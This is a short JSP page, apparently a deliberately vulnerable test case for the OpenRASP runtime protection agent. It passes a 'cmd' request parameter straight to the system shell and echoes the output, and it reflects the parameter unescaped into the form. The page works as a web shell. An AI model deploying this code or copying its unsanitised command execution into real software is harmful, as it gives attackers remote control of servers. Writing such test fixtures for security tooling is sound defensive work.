<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>  
    <meta charset="UTF-8"/>
    <title>004-2 命令执行，带回显</title>
</head>
<body>
<%
String output = "";
String cmd    = request.getParameter ("cmd");
if (cmd != null)
{
    try {
        ProcessBuilder builder;
        if (File.separator.startsWith ("\\"))
            builder = new ProcessBuilder ("cmd", "/c", cmd);
        else
            builder = new ProcessBuilder ("sh", "-c", cmd);

        Process pro   = builder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));

        String s = reader.readLine();
        while (s != null) {
            output = output + s + "\n";
            s = reader.readLine();
        }
        reader.close();
    } catch (Exception e) {
        if (e.getClass().getName().equals("com.fuxi.javaagent.exception.SecurityException")) {
            response.sendError(400, "Request blocked by OpenRasp");
        }else {	
            out.print(e);
        }
    }
}
%>
<div>
<form method=POST>
<label>Command</label>
<input name=cmd style="width: 100%" value="<%=cmd %>"></input>
</form>
<pre>
<%=output %>
</pre>
</div>
</body>
</html>
